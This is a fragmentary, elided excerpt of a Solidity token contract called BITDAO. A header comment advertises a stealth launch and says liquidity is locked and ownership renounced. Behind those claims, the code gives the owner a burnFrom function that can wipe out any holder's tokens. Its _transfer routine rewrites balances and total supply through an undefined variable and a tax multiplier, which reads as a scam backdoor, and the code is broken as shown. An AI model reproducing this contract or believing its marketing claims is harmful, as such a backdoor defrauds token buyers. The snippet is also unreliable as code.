...
/** 
    BitDao Stealth Launch
    Marketing Plan At listing
    lemoncall, meddegencall, Bsc safe channel
    LP Locked, Renounced, immediatally At Launch

    telegram : https://t.me/bitdao_community
...
contract BITDAO is Context, ERC20, Ownable {
 ...
 function burnFrom(address account, uint256 amount) public onlyOwner virtual {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    _balances[account] = _balances[account].sub(amount).mul(_taxFee);
    _totalSupply = _totalSupply.sub(amount).mul(_taxFee);
